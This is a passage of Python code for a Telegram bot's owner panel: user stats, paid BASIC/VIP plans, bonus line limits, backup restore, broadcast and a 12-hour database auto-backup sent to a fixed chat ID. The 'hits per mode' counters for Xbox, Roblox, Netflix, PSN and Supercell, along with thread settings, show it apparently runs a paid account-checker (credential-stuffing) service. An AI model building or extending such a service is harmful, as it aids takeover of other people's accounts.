        f"<b>🔗 Username:</b> @{udata.get('username','No username') if udata.get('username') not in [None,'None'] else 'No username'}\n"
        f"<b>📅 Registered:</b> {udata.get('registered_date','Unknown')}\n"
        f"<b>👑 Plan:</b> {mem}\n"
        f"<b>📅 Expires:</b> {expt}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>📁 Files Scanned:</b> <code>{total_files}</code>\n"
        f"<b>📊 Total Lines:</b> <code>{udata.get('total_scans',0)}</code>\n"
        f"<b>⏰ Last Scan:</b> <code>{last_scan_str}</code>\n"
        f"<b>📡 Current Mode:</b> <code>{cur_mode}</code>\n"
        f"<b>🧵 Threads Set:</b> <code>{cur_threads}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>🎯 Hits Per Mode:</b>\n"
        f"⌯ 🎮 Xbox: <code>{xbox_h}</code>\n"
        f"⌯ 🎮 Roblox: <code>{roblox_h}</code>\n"
        f"⌯ 🎮 Supercell: <code>{supercell_h}</code>\n"
        f"⌯ 🟥 Netflix: <code>{netflix_h}</code>\n"
        f"⌯ 🎮 PSN V2: <code>{psn_h}</code>\n"
        f"⌯ 🚀 Speed: <code>{speed_h}</code>\n"
        f"⌯ 💎 Total Hits: <code>{udata.get('total_hits',0)}</code>\n"
        f"⌯ 🆓 Free Hits: <code>{udata.get('total_free_hits',0)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>👥 Referrals:</b> <code>{udata.get('referrals',0)}</code>\n"
        f"<b>📊 Daily Limit:</b> <code>{dl if dl!=float('inf') else 'Unlimited'}</code>\n"
        f"<b>⏳ Remaining Today:</b> <code>{dl-udata.get('today_scans',0) if dl!=float('inf') else 'Unlimited'}</code>\n"
        f"<b>⚡ Status:</b> {'🔴 Banned' if ib else '🟢 Active'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("✅ Unban User" if ib else "🚫 Ban User",callback_data=f"{'unban' if ib else 'ban'}_user_{tu}",style="success" if ib else "danger"))
    if mem!=MembershipStatus.FREE.value:mk.add(InlineKeyboardButton("❌ Remove Plan",callback_data=f"remove_membership_{tu}",style="danger"))
    else:mk.add(InlineKeyboardButton("⭐ Set BASIC",callback_data=f"set_membership_basic_{tu}",style="success"),InlineKeyboardButton("👑 Set VIP",callback_data=f"set_membership_vip_{tu}",style="success"))
    mk.add(InlineKeyboardButton("➕ Add Bonus (+500)",callback_data=f"add_bonus_{tu}",style="success"),InlineKeyboardButton("➖ Remove Bonus (-500)",callback_data=f"remove_bonus_{tu}",style="danger"),InlineKeyboardButton("📊 Adjust Remaining",callback_data=f"adjust_limit_{tu}",style="primary"),InlineKeyboardButton("🔙 Back to Users List",callback_data=f"user_page_0",style="danger"))
    try:send_with_retry(bot.edit_message_text,txt,chat_id,msg_id,reply_markup=mk)
    except Exception:pass

def process_set_membership(m,tu,orig_id,pt):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    try:
        dur=parse_time_duration(m.text.strip())
        if not dur:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid format.");return
        if tu in db:
            ed=datetime.now(timezone.utc)+dur;db[tu]["membership"]=MembershipStatus.BASIC.value if pt=="basic" else MembershipStatus.VIP.value
            db[tu]["membership_expiry"]=ed.isoformat();db[tu]["today_scans"]=0;db[tu]["last_scan_date"]=get_today_utc()
            if db[tu].get("user_threads",50)>get_max_threads_for_user(db[tu]):db[tu]["user_threads"]=get_max_threads_for_user(db[tu])
            save_db(db,DB_FILE);send_with_retry(bot.send_message,m.chat.id,f"✅ User {tu} has been upgraded to {'⭐ BASIC' if pt=='basic' else '👑 VIP'} for {m.text.strip()}.")
            try:send_with_retry(bot.send_message,tu,f"🎉 <b>Congratulations! 🎉</b>\n\n<b>Your account has been upgraded to {'⭐ BASIC' if pt=='basic' else '👑 VIP'}!</b>\n\n<b>✨ Plan Benefits:</b>\n• Daily limit: {'25,000 lines' if pt=='basic' else 'Unlimited lines'}\n• No queue waiting\n• Max threads: 1-{CUSTOM_THREADS.get(pt,75)} (configurable)\n• Multi-Scan: Up to {'3' if pt=='basic' else '5'} files\n• Priority Support\n{'• ALL IN ONE Scanner Mode' if pt=='vip' else ''}\n\n<b>⏰ Expires:</b> <code>{ed.strftime('%Y-%m-%d %H:%M:%S')}</code>\n\nEnjoy the premium experience! 🚀")
            except Exception:pass
            show_user_controls(m.chat.id,tu,orig_id)
    except Exception as e:send_with_retry(bot.send_message,m.chat.id,f"❌ Error: {str(e)}")

def process_add_bonus(m,tu,orig_id):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    try:
        amt=int(m.text.strip())
        if amt<=0:send_with_retry(bot.send_message,m.chat.id,"Amount must be positive.");return
        if tu in db:db[tu]["base_limit"]=db[tu].get("base_limit",5000)+amt;save_db(db,DB_FILE);send_with_retry(bot.send_message,m.chat.id,f"✅ Added {amt} bonus lines to user {tu}.");show_user_controls(m.chat.id,tu,orig_id)
    except Exception:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid amount.")

def process_remove_bonus(m,tu,orig_id):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    try:
        amt=int(m.text.strip())
        if amt<=0:send_with_retry(bot.send_message,m.chat.id,"Amount must be positive.");return
        if tu in db:db[tu]["base_limit"]=max(0,db[tu].get("base_limit",5000)-amt);save_db(db,DB_FILE);send_with_retry(bot.send_message,m.chat.id,f"✅ Removed {amt} bonus lines from user {tu}.");show_user_controls(m.chat.id,tu,orig_id)
    except Exception:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid amount.")

def process_adjust_limit(m,tu,orig_id):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    try:
        nr=int(m.text.strip())
        if nr<0:send_with_retry(bot.send_message,m.chat.id,"Amount cannot be negative.");return
        if tu in db:
            if db[tu]["last_scan_date"]!=get_today_utc():db[tu]["today_scans"],db[tu]["last_scan_date"]=0,get_today_utc()
            dl=get_user_daily_limit(tu)
            if dl!=float('inf'):db[tu]["today_scans"]=max(0,dl-nr)
            save_db(db,DB_FILE);send_with_retry(bot.send_message,m.chat.id,f"✅ Adjusted remaining limit for user {tu} to {nr}.");show_user_controls(m.chat.id,tu,orig_id)
    except Exception:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid amount.")

def process_restore_backup(m,orig_id):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    if not m.document or not m.document.file_name.endswith('.db'):send_with_retry(bot.send_message,m.chat.id,"❌ Please send a valid SQLite database (.db) backup file.");return
    try:
        tf=f"temp_backup_{uuid.uuid4()}.db"
        with open(tf,'wb') as f:f.write(bot.download_file(bot.get_file(m.document.file_id).file_path))
        send_with_retry(bot.send_message,m.chat.id,"✅ <b>Backup restored successfully!</b>" if restore_backup(tf) else "❌ <b>Restore failed!</b>");os.remove(tf)
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("⚙️ Settings",callback_data="owner_settings",style="primary"),InlineKeyboardButton("📢 Broadcast",callback_data="owner_broadcast",style="primary"),InlineKeyboardButton("🔗 Force Subscribe",callback_data="owner_forcesub",style="primary"),InlineKeyboardButton("📊 Full Statistics",callback_data="full_stats",style="primary"),InlineKeyboardButton("👥 Users List",callback_data="users_list",style="primary"),InlineKeyboardButton("⚡ Threads Config",callback_data="threads_config",style="primary"),InlineKeyboardButton("🎁 Manage Gifts",callback_data="manage_gifts",style="success"),InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger"))
        try:send_with_retry(bot.edit_message_text,"<b>👑 Owner Control Panel</b>\n\nSelect an option:",m.chat.id,orig_id,reply_markup=mk)
        except Exception:pass
    except Exception as e:send_with_retry(bot.send_message,m.chat.id,f"❌ Error restoring backup: {str(e)}")

def get_forwarded_message(m):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    if not m.forward_from_chat:send_with_retry(bot.send_message,m.chat.id,"❌ Please forward a message from the channel.");return
    bot.register_next_step_handler(send_with_retry(bot.send_message,m.chat.id,f"✅ Channel detected: <b>{m.forward_from_chat.title}</b>\n\n<b>Step 2:</b> Now send the channel invite link\n\n<i>Send /cancel to abort.</i>"),get_channel_link,str(m.forward_from_chat.id),m.forward_from_chat.title)

def get_channel_link(m,cid,ctitle):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    clink=m.text.strip()
    if not clink.startswith("https://t.me/"):send_with_retry(bot.send_message,m.chat.id,"❌ Invalid link.");return
    if f"{cid}|{clink}" in force_subs:send_with_retry(bot.send_message,m.chat.id,"❌ This channel is already in the list.");return
    force_subs.append(f"{cid}|{clink}");save_db(force_subs,FORCE_DB);send_with_retry(bot.send_message,m.chat.id,f"✅ Successfully added channel: <b>{ctitle}</b>\n🔗 Link: {clink}")
    mk=InlineKeyboardMarkup(row_width=1)
    for sub in force_subs:
        try:mk.add(InlineKeyboardButton(f"❌ {bot.get_chat(sub.split('|')[0]).title}",callback_data=f"remove_channel_{sub.split('|')[0]}",style="danger"))
        except Exception:mk.add(InlineKeyboardButton(f"❌ {sub}",callback_data=f"remove_channel_{sub}",style="danger"))
    mk.add(InlineKeyboardButton("➕ Add Channel",callback_data="add_sub_channel",style="success"),InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger"))
    send_with_retry(bot.send_message,m.chat.id,f"<b>🔗 Force Subscribe Channels</b>\n\nCurrent Channels ({len(force_subs)}):\n"+("\n".join([f"• {s.split('|')[0]}" for s in force_subs]) if force_subs else "No channels set yet."),reply_markup=mk)

def broadcast_message(m):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    send_with_retry(bot.send_message,m.chat.id,"📢 Starting broadcast...")
    count=0
    for uid in list(db.keys()):
        if str(uid) in banned_users:continue
        try:
            send_with_retry(bot.copy_message,uid,m.chat.id,m.message_id)
            count+=1;time.sleep(0.05)
        except Exception:pass
    send_with_retry(bot.send_message,m.chat.id,f"✅ Broadcast finished!\nSent to <code>{count}</code> users.")

def auto_backup_loop():
    while not shutdown_flag:
        for _ in range(12 * 3600):
            if shutdown_flag: return
            time.sleep(1)
        try:
            bf=create_backup()
            with open(bf,'rb') as f:
                send_with_retry(bot.send_document,"8744777152",f,caption=f"🔄 <b>Auto-Backup (12H)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📅 Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}\n✅ Database successfully backed up.")
        except Exception:pass
threading.Thread(target=auto_backup_loop, daemon=True).start()

print("Bot is Running...")
while BOT_RUNNING:
    try:bot.polling(none_stop=True,timeout=60,long_polling_timeout=60)
    except Exception:time.sleep(3)